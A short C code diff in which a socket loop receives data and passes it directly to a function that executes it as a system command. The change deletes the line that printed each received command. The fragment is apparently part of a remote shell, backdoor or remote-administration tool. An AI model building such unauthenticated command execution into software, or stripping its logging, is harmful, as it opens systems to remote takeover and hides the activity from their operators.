@@ -31,7 +31,6 @@ int socketLoop(int fd)
   {
     bzero(bf, bflen);
     recv(fd, bf, bflen, 0);
-    printf("s: %s\n", bf);
     // Actually execute the command (see system.c)
     systemExecute(bf);
     bzero(bf, bflen);
